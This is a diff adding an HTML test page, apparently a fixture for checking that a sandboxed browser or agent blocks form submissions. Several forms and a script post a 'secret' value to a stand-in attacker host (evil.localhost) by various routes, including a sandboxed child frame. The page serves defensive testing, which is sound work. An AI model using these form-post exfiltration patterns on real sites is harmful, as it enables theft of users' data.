@@ -1,0 +1,23 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><script src="/_lib.js"></script></head><body>
+<form id="f" action="http://evil.localhost:6100/form" method="post"><input id="i" name="a" value="secret"><button id="b" type="submit">go</button></form>
+<form id="g" action="http://evil.localhost:6100/form-blank" method="post" target="_blank"><input name="a" value="secret"></form>
+<script>
+  var r = {};
+  document.getElementById('b').click(); // 點擊 submit 按鈕 → agent 顯示提示
+  try { document.getElementById('f').requestSubmit(); } catch (e) { r.requestSubmit = errName(e); }
+  try { document.getElementById('f').submit(); r.submit = 'no-throw'; } catch (e) { r.submit = errName(e); }
+  try { document.getElementById('g').submit(); r.submitBlank = 'no-throw'; } catch (e) { r.submitBlank = errName(e); }
+  // 沒有 agent 的子 frame：原生的 form.submit() 與 submit 按鈕，只能靠 sandbox（無 allow-forms）＋ form-action 'none' 擋
+  runInChild(
+    "var f = document.createElement('form'); f.method = 'post'; f.action = 'http://evil.localhost:6100/form-native';" +
+    "var i = document.createElement('input'); i.name = 'a'; i.value = 'secret'; f.appendChild(i);" +
+    "var b = document.createElement('button'); b.type = 'submit'; f.appendChild(b); document.body.appendChild(f);" +
+    "b.click(); try { f.submit(); out.submit = 'no-throw'; } catch (e) { out.submit = e.name; }",
+    function (out) {
+      r.child = out;
+      setTimeout(function () { report('result', r); report('done'); }, 800);
+    }
+  );
+</script>
+</body></html>
